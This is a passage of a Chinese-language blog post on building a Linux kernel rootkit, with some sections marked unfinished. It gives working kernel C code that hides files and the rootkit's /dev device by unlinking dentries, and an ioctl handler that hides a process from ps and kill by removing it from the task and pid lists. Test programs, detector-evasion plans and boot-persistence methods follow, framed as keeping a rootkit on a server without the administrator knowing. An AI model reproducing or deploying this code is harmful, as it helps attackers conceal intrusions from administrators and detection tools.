+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">iterate_dir</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> dir_context *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line">	<span class="type">bool</span> shared = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">int</span> res = -ENOTDIR;</span><br><span class="line">	<span class="keyword">if</span> (file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line">		shared = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate)</span><br><span class="line">		<span class="keyword">goto</span> out</span><br><span class="line">        </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">		ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line">		<span class="keyword">if</span> (shared)</span><br><span class="line">			res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			res = file-&gt;f_op-&gt;iterate(file, ctx);</span><br><span class="line">		file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">		fsnotify_access(file);</span><br><span class="line">		file_accessed(file);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>在 Linux 内核中使用 VFS 统一不同的文件系统，其中使用 <code>file</code> 结构体来表示一个文件，而每个文件都有一张函数表 <code>file_operations</code> 函数表对应相应的对该文件的相关操作（例如 read、write），该函数表取自该文件对应的 inode，最终取自相应的文件系统提供的具体函数</p>
+<p>在这里会调用表中的函数指针 <code>iterate_shared</code> 或 <code>iterate</code>，用 gdb 简单调试一下内核，可以发现在 <code>5.11.0</code> 版本的内核中调用的是 <code>iterate_shared</code></p>
+<p><img src="https://i.loli.net/2021/07/10/I6UxoPeCmWJYEfH.png" alt="image.png"></p>
+<h3 id="EXT4：（未完成）"><a href="#EXT4：（未完成）" class="headerlink" title="EXT4：（未完成）"></a>EXT4：（未完成）</h3><p>笔者的机子用的是 <code>ext4</code> 文件系统，这也是目前 Linux 机器最常见的文件系统之一，我们来看内核源码中对应函数的实现，在 <code>/fs/ext4/dir.c</code> 中有如下定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_dir_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= ext4_dir_llseek,</span><br><span class="line">	.read		= generic_read_dir,</span><br><span class="line">	.iterate_shared	= ext4_readdir,</span><br><span class="line">	.unlocked_ioctl = ext4_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	.compat_ioctl	= ext4_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.fsync		= ext4_sync_file,</span><br><span class="line">	.release	= ext4_release_dir,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>即 <code>ext4</code> 文件系统中 <code>iterate_shared</code> 便是 <code>ext4_readdir</code>，该函数定义于 <code>/fs/ext4/dir.c</code> 中，</p>
+<blockquote>
+<p>🕊🕊🕊</p>
+</blockquote>
+<h3 id="ramVFS：d-child-链表脱链隐藏文件"><a href="#ramVFS：d-child-链表脱链隐藏文件" class="headerlink" title="ramVFS：d_child 链表脱链隐藏文件"></a>ramVFS：d_child 链表脱链隐藏文件</h3><p>我们都知道在 VFS 中 <code>dentry</code> （目录项）用以表示一个文件&#x2F;文件夹，对于 dentry 而言，其构成如下图所示拓扑结构</p>
+<p><img src="https://i.loli.net/2021/07/14/4zlJSm9V1Rg57tB.png" alt="image.png"></p>
+<p>由此拓扑结构我们不难看出：在 VFS 中基于 dentry 的 d_child 链表遍历一个目录。由此我们不难想到的是<strong>只要我们将一个文件的 dentry 从其 d_child 链表中脱链，就能成功隐藏该文件</strong></p>
+<p>我们在 VFS 中隐藏文件的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hideFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * filename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">hide_file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> * <span class="title">hide_dentry</span>;</span></span><br><span class="line"></span><br><span class="line">    hide_file = filp_open(filename, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR(hide_file))</span><br><span class="line">    &#123;</span><br><span class="line">        hide_dentry = hide_file-&gt;f_path.dentry;</span><br><span class="line"></span><br><span class="line">        hide_dentry-&gt;d_child.next-&gt;prev = hide_dentry-&gt;d_child.prev;</span><br><span class="line">        hide_dentry-&gt;d_child.prev-&gt;next = hide_dentry-&gt;d_child.next;</span><br><span class="line"></span><br><span class="line">        filp_close(hide_file, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用 qemu 起一个虚拟机跑我们的 rootkit，用 busybox 构建一个文件系统</p>
+<p>简单测试一下，当我们将要隐藏的文件在 VFS 中对应的 dentry 从其 d_child 链表中摘除之后，我们便无法通过 <code>ls</code> 或是 <code>find</code> 命令找到这个文件，<strong>但是该文件仍能被正常访问</strong>，由此我们成功地将一个文件隐藏了起来</p>
+<p><img src="https://i.loli.net/2021/07/23/zkT3X6xEnMtbhaf.png" alt="image.png"></p>
+<h4 id="x2F-dev-设备文件隐藏"><a href="#x2F-dev-设备文件隐藏" class="headerlink" title="&#x2F;dev 设备文件隐藏"></a>&#x2F;dev 设备文件隐藏</h4><p>同样地，我们用以与 rootkit 进行通信的设备文件基于 <code>devtmpfs</code>，为基于 ram 的文件系统，因此我们可以直接在 VFS 中将其 dentry 从其 d_child 链表脱链，完成该设备文件的隐藏</p>
+<p>简单测试一下，我们在 <code>/dev</code> 目录下已经无法找到该设备文件，但是我们仍能与我们的 rootkit 正常通信</p>
+<p><img src="https://i.loli.net/2021/07/23/UIDQ41CKMBNhEWu.png" alt="image.png"></p>
+<blockquote>
+<p>这里简单讲一下 Linux 内核中的 VFS——Virtual File System，VFS 为对文件系统的操作提供了统一的接口，将对 ext2、ext3、ntfs…之类的文件系统的操作在 VFS Layer 中统一，由 VFS 向用户及内核的其他部分提供文件操作的统一 API</p>
+<p>VFS 中的文件为如下结构（此图来自于<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/61123802">知乎</a>）：</p>
+<p><img src="https://i.loli.net/2021/07/10/L1Jbl8Qkqe4rYxp.png" alt="image.png"></p>
+<p>简单讲一下这张图中涉及到的内核数据结构：</p>
+<ul>
+<li>task_struct：内核中的进程描述符</li>
+<li>file_struct：每个进程打开的文件的文件描述符表</li>
+<li>file：内核 VFS 中的文件描述符，用以描述一个文件对象</li>
+<li>path：</li>
+<li>inode：文件索引项，用以索引硬盘上的文件，一个 inode 对应一个文件</li>
+<li>dentry：目录项，仅会在内存中被创建，用以加快索引，一个目录项对应一条路径上的一个组件（例如路径 <code>/a3dir/a3pro.c</code> 对应三个 dentry：<code>/</code> 、 <code>a3dir</code>、<code>a3proc.c</code>）</li>
+<li>address_space：</li>
+<li>super_block：用以描述一个文件系统的相关信息（如 inode 等），一个文件系统对应一个 super_block</li>
+</ul>
+<p>在内核中每次打开文件都会创建一个 file 对象，因而一个文件在内核中可以对应多个 file 对象，但是只能对应一个 inode 和一个 dentry</p>
+<p>我们来简单观察文件在内核中创建的过程，观察到如下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;sys_open()												// fs/open.c</span><br><span class="line">	do_sys_open()										// fs/open.c</span><br><span class="line">	do_sys_openat2()								// fs/open.c，获取文件名字，在 PCB 中分配空闲 fd</span><br><span class="line">			do_filp_open()								// fs/namei.c</span><br><span class="line">				set_nameidata()							// fs/namei.c，获取 nameidata结构体（辅助搜索结构）</span><br><span class="line">				path_openat()							// fs/namei.c</span><br><span class="line">					alloc_empty_file()					// 分配 file 结构体空间</span><br><span class="line">					do_open()							// fs/namei.c</span><br><span class="line">						audit_inode()					// include/linux/audit.h</span><br><span class="line">							__audit_inode()				// kernel/auditsc.c，获取文件对应 inode 存到 nameidata</span><br><span class="line">						vfs_open()						// fs/open.c</span><br><span class="line">							d_backing_inode()			// include/linux/dcache.h，取得 nameidata 中 inode</span><br><span class="line">							do_detry_open()				// fs/open.c，初始化 file 结构体各项属性</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>观察 <code>do_dentry_open()</code> 代码，我们可以发现如下逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="type">static</span> <span class="type">int</span> <span class="title function_">do_dentry_open</span><span class="params">(<span class="keyword">struct</span> file *f,</span></span><br><span class="line"><span class="params">			  <span class="keyword">struct</span> inode *inode,</span></span><br><span class="line"><span class="params">		  <span class="type">int</span> (*open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *))</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	f-&gt;f_op = fops_get(inode-&gt;i_fop);</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+
+<p>即初始时 file 结构体的 file_operations 函数表使用的是其对应 inode 的 <code>i_fop</code> 成员</p>
+</blockquote>
+<h1 id="0x04-进程隐藏"><a href="#0x04-进程隐藏" class="headerlink" title="0x04.进程隐藏"></a>0x04.进程隐藏</h1><p>在内核当中没有 glibc 库，若是想要进行一些常规的操作其实是较为困难的，相比之下一个 root 权限的进程比内核模块更适合也更方便去做这些事情，因此除了内核模块以外我们的 rootkit 还应当包含有一个用户态下的进程，但是<strong>这个进程同样很容易被发现</strong>，因此我们还需要完成进程隐藏的工作：</p>
+<ul>
+<li>脱离 task_struct 链表</li>
+<li>脱离 pid 链表</li>
+<li>重分配 task_struct 内存空间</li>
+<li>重分配 cred 内存空间</li>
+<li>设置手动内存回收</li>
+</ul>
+<p>当然，如下给出的进程隐藏的方法仍有风险：<strong>我们无法将该进程从运行队列中隐藏（不然没法跑），因此若是遍历运行队列仍有可能发现我们的恶意进程</strong>，因此我们后续的恶意进程的设计最好不要过于大张旗鼓</p>
+<h2 id="Step-I-从-task-struct-链表与-pid-链表中摘除进程"><a href="#Step-I-从-task-struct-链表与-pid-链表中摘除进程" class="headerlink" title="Step-I. 从 task_struct 链表与 pid 链表中摘除进程"></a>Step-I. 从 task_struct 链表与 pid 链表中摘除进程</h2><p>我们都知道 Linux kernel 中的 PCB 为 task_struct 结构体，多个 task_struct 之间相互连接成双向链表结构，若是运维人员选择<strong>遍历 task_struct 链表便很容易发现我们的恶意进程</strong>，因此我们需要将我们的进程从 task_struct 链表中摘除</p>
+<p>同样的，运维人员若是遍历 <code>/proc/pid</code> 、甚至是直接遍历所有进程号，则很容易发现我们的恶意进程，因此我们还需要<strong>将其从 pid 链表中摘除</strong></p>
+<p>为了预防万一，这里还写了一个将进程恢复至链表中的功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">hide_task</span>[0<span class="title">x10</span>] =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">a3_rootkit_ioctl</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">cur_node</span>;</span></span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    cur_node = &amp;current-&gt;pid_links[PIDTYPE_PID];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x1001</span>:    <span class="comment">// hide process</span></span><br><span class="line">            <span class="keyword">for</span> (temp = <span class="number">0</span>;hide_task[temp];temp++)</span><br><span class="line">                ;</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="number">0x10</span>)  <span class="comment">//full</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            hide_task[temp] = current;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// remove from task_struct lists</span></span><br><span class="line">            list_del_rcu(&amp;current-&gt;tasks);</span><br><span class="line">            INIT_LIST_HEAD(&amp;current-&gt;tasks);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// remove from pid lists</span></span><br><span class="line">            hlist_del_rcu(cur_node);</span><br><span class="line">            INIT_HLIST_NODE(cur_node);</span><br><span class="line">            cur_node-&gt;pprev = &amp;cur_node;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x1002</span>:    <span class="comment">// restore process</span></span><br><span class="line">            task = hide_task[param];</span><br><span class="line">            list_add_tail_rcu(&amp;task-&gt;tasks, &amp;init_task.tasks);</span><br><span class="line">            hlist_add_head_rcu(&amp;task-&gt;pid_links[PIDTYPE_PID], &amp;task-&gt;thread_pid-&gt;tasks[PIDTYPE_PID]);</span><br><span class="line">            hide_task[param] = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>附上两个测试例程：</p>
+<blockquote>
+<p>hide_itself.c</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/intel_rapl_msrdv&quot;</span>, O_RDWR);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1001</span>);</span><br><span class="line">    sleep(<span class="number">114514</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>reshow.c</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/intel_rapl_msrdv&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x1002</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单测试一下，可以发现我们很好地完成了进程隐藏的功能：当我们的进程被隐藏之后，<strong>我们无法使用 ps 命令找到她，也无法通过 kill 命令杀死她</strong>，只有当我们将其恢复之后才能正常找到并将其 kill 掉</p>
+<p><img src="https://i.loli.net/2021/07/22/7NYgtqAmRcEIKy1.png" alt="image.png"></p>
+<h2 id="Step-II-重分配-PCB-相关内存空间（未完成）"><a href="#Step-II-重分配-PCB-相关内存空间（未完成）" class="headerlink" title="Step-II. 重分配 PCB 相关内存空间（未完成）"></a>Step-II. 重分配 PCB 相关内存空间（未完成）</h2><p>我们简单看一下进程的创建方式：在 Linux 启动时会有一个 init 进程，接下来的进程都是 init 的子进程，故我们接下来阅读 <code>fork</code> 系统调用的源码，观察到如下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_fork()</span><br><span class="line">	kernel_clone()</span><br><span class="line">		copy_process()</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>copy_process()</code> 函数中使用 <code>dup_task_struct()</code> 分配新的 task_struct 结构体，阅读内核源码观察到如下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dup_task_struct()</span><br><span class="line">	alloc_task_struct_node()</span><br><span class="line">		kmem_cache_alloc_node()</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>alloc_task_struct_node()</code> 中调用 <code>kmem_cache_alloc_node()</code> 从 <code>task_struct_cachep</code> 这个 <code>kmem_cache</code> 中分配 task_struct 结构体所需内存，因此我们不难想到的是若是 rootkit 检测工具选择<strong>遍历 task_struct_cachep，我们的恶意进程将无处可逃</strong></p>
+<blockquote>
+<p>一个 kmem_cache 由多个 slub 组成，一个 slub 为由 buddy system 分配而来的一个或多个连续页框组成，划分为数个小 chunk 进行使用</p>
+<blockquote>
+<p>图是偷的，侵删</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p>
+</blockquote>
+<p>同样地，在 <code>copy_process()</code> 函数中使用 <code>copy_creds()</code> 分配新的 cred 结构体，阅读内核源码观察到如下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy_creds()</span><br><span class="line">	prepare_creds()</span><br><span class="line">		kmem_cache_alloc()</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>prepare_creds()</code> 中调用 <code>kmem_cache_alloc()</code> 从 <code>cred_jar</code> 这个 <code>kmem_cache</code> 中分配 cred 结构体所需内存，因此我们不难想到的是若是 rootkit 检测工具选择<strong>遍历cred_jar，我们的恶意进程将无处可逃</strong></p>
+<p>因此我们需要重新分配其内存空间，为了保险起见，我们不直接向现有的 slub 申请空间，而是<strong>绕过 slub 直接向 buddy system 申请内存页</strong>来存放我们的隐藏进程的 task_struct 与 cred</p>
+<p>但由于我们绕过了 slub 进行内存替换，此时<strong>内核已经无法通过正常途径回收该进程的 task_struct 与 cred</strong>，因此我们需要：</p>
+<ul>
+<li>设置其引用计数器为大于 <code>1</code> 的值，在进程退出之后操作系统便<strong>不会直接回收其内存</strong></li>
+<li>在 rootkit 中写一个回收函数，<strong>手动回收</strong>我们的恶意进程的内存（例如由另一个进程向 rootkit 发送回收的信号）</li>
+</ul>
+<h1 id="0x05-驻留"><a href="#0x05-驻留" class="headerlink" title="0x05.驻留"></a>0x05.驻留</h1><p>我们似乎在管理员不知情的情况下在他服务器中留下了一个 rootkit，但若是某一天服务器管理员闲着无聊 <code>reboot</code> 一下，我们的努力将<strong>全  部  木  大</strong>，因此我们还需要研究如何让 rootkit 在服务器能够长期驻留</p>
+<p>我们不难想到的是，若是我们能够向一些开机便会自行启动的服务中写入加载我们的 rootkit 的指令，那么每一次系统启动的时候我们的 rootkit 便能被自动载入到内核当中</p>
+<h2 id="方法-I-写入-etc-rc-modules"><a href="#方法-I-写入-etc-rc-modules" class="headerlink" title="方法 I. 写入/etc/rc.modules"></a>方法 I. 写入<code>/etc/rc.modules</code></h2><p>这也是大名鼎鼎的 Linux rootkit <code>Raptile</code> 所采用的操作</p>
+<h2 id="方法-II-写入initrd"><a href="#方法-II-写入initrd" class="headerlink" title="方法 II. 写入initrd"></a>方法 II. 写入initrd</h2><h1 id="0x06-用户态进程"><a href="#0x06-用户态进程" class="headerlink" title="0x06.用户态进程"></a>0x06.用户态进程</h1><h2 id="PRE-启动新进程"><a href="#PRE-启动新进程" class="headerlink" title="PRE.启动新进程"></a>PRE.启动新进程</h2><p>可以使用 <code>_wake_up_new_task()</code> 将一个 <code>task_struct</code> 加入运行队列</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>arttnba3</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/">http://arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Linux/"># Linux</a>
+                    
+                        <a href="/tags/Linux-Kernel/"># Linux Kernel</a>
+                    
+                        <a href="/tags/ROOTKIT/"># ROOTKIT</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/08/03/CVE-0X02-CVE-2017-5123/">【CVE.0x02】CVE-2017-5123 waitid 漏洞复现及简要分析</a>
+            
+            
+            <a class="next" rel="next" href="/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>
+            © 2022 arttnba3 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a>
+        </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
